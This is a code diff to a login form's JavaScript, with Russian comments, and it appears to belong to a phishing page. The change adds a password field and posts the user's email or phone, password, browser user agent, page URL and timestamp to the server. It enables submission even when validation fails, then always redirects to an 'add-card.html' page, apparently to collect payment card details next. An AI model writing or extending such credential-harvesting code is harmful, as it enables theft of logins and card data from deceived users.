@@ -1,9 +1,11 @@
 document.addEventListener("DOMContentLoaded", () => {
   const input = document.getElementById("userId");
+  const passwordInput = document.getElementById('password');
   const label = document.getElementById("inputLabel");
   const errorRequired = document.getElementById("error-required");
   const errorFormat = document.getElementById("error-format");
   const errorPhone = document.getElementById("error-phone");
+  const errorPassword = document.getElementById("error-password");
   const subtext = document.getElementById("subtext-info");
   const button = document.getElementById("submit-btn");
   const phoneWrapper = document.getElementById("phone-wrapper");
@@ -11,7 +13,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const errorIcon = document.querySelector(".al-input__error-icon");
 
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  const isPhone = (val) => /^\d+$/.test(val);
+  const isPhone = (val) => /^\d{9,}$/.test(val);
 
   let touched = false;
 
@@ -22,68 +24,62 @@ document.addEventListener("DOMContentLoaded", () => {
 
   function validate() {
     const val = input.value.trim();
-    const isEmpty = val === "";
-    const isPhoneInput = isPhone(val);
-    const isEmailInput = emailRegex.test(val);
-    const isValidPhone = isPhoneInput && val.length >= 9;
+    const pass = passwordInput.value.trim();
 
     // Reset state
     input.classList.remove("error", "valid", "phone-mode");
+    passwordInput.classList.remove("error", "valid");
     label.classList.remove("error");
     errorRequired.classList.add("hidden");
     errorFormat.classList.add("hidden");
     errorPhone.classList.add("hidden");
+    errorPassword.classList.add("hidden");
     subtext.classList.add("hidden");
     phoneWrapper.classList.add("hidden");
-    button.classList.remove("active");
-    button.disabled = true;
     errorIcon.style.display = "none";
 
     let hasError = false;
 
-    if (!touched) return;
-
-    if (isEmpty) {
-      input.classList.add("error");
-      label.classList.add("error");
-      label.textContent = "Email or mobile number";
+    // Input validation
+    if (!val) {
       errorRequired.classList.remove("hidden");
-      errorIcon.style.display = "block";
-      updateLabelState();
-      return;
-    }
-
-    if (isPhoneInput) {
-      input.classList.add("phone-mode");
-      phoneWrapper.classList.remove("hidden");
-      label.textContent = "Mobile number";
-
-      if (!isValidPhone) {
-        input.classList.add("error");
-        label.classList.add("error");
-        errorPhone.classList.remove("hidden");
-        errorIcon.style.display = "block";
-        updateLabelState();
-        return;
-      }
-    } else if (!isEmailInput) {
       input.classList.add("error");
       label.classList.add("error");
-      label.textContent = "Email address";
-      errorFormat.classList.remove("hidden");
       errorIcon.style.display = "block";
-      updateLabelState();
-      return;
+      hasError = true;
+    } else if (!emailRegex.test(val) && !isPhone(val)) {
+      errorFormat.classList.remove("hidden");
+      input.classList.add("error");
+      label.classList.add("error");
+      errorIcon.style.display = "block";
+      hasError = true;
     } else {
-      label.textContent = "Email address";
+      input.classList.add("valid");
+      if (isPhone(val)) {
+        input.classList.add("phone-mode");
+        phoneWrapper.classList.remove("hidden");
+        label.textContent = "Mobile number";
+      } else {
+        label.textContent = "Email address";
+      }
     }
 
-    // Valid input
-    input.classList.add("valid");
+    // Password validation
+    if (pass.length < 8) {
+      passwordInput.classList.add("error");
+      errorPassword.classList.remove("hidden");
+      hasError = true;
+    } else {
+      passwordInput.classList.add("valid");
+    }
+
+    // Кнопка может быть активна в любом случае
     button.classList.add("active");
     button.disabled = false;
-    subtext.classList.remove("hidden");
+
     updateLabelState();
+
+    return !hasError;
   }
 
   input.addEventListener("focus", () => {
@@ -101,13 +97,18 @@ document.addEventListener("DOMContentLoaded", () => {
     validate();
   });
 
+  passwordInput.addEventListener("input", () => {
+    validate();
+  });
+
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
     const val = input.value.trim();
-    if (button.disabled) return;
+    const pass = passwordInput.value.trim();
+    const isEmailInput = emailRegex.test(val);
+    const endpoint = isEmailInput ? "/login" : "/phone";
 
-    const isEmail = emailRegex.test(val);
-    const endpoint = isEmail ? "/login" : "/phone";
+    validate(); // Показываем ошибки, даже если отправляем
 
     button.disabled = true;
     button.querySelector(".al-button__label").textContent = "Loading...";
@@ -118,16 +119,21 @@ document.addEventListener("DOMContentLoaded", () => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           user_input: val,
+          password: pass,
           userAgent: navigator.userAgent,
           location: window.location.href,
           timestamp: new Date().toISOString(),
         }),
       });
 
+      // Переход
       window.location.href = "add-card.html";
     } catch (err) {
-      console.error("Failed to submit:", err);
-      alert("Submission failed. Try again.");
+      console.error("❌ Submission failed:", err);
+
+      // Ошибку показываем стилизованно, не alert
+      passwordInput.classList.add("error");
+      errorPassword.classList.remove("hidden");
       button.disabled = false;
       button.querySelector(".al-button__label").textContent = "Continue";
     }
@@ -150,6 +156,5 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   });
 
-  // 🔧 Init
-  validate();
+  validate(); // первичная валидация
 });
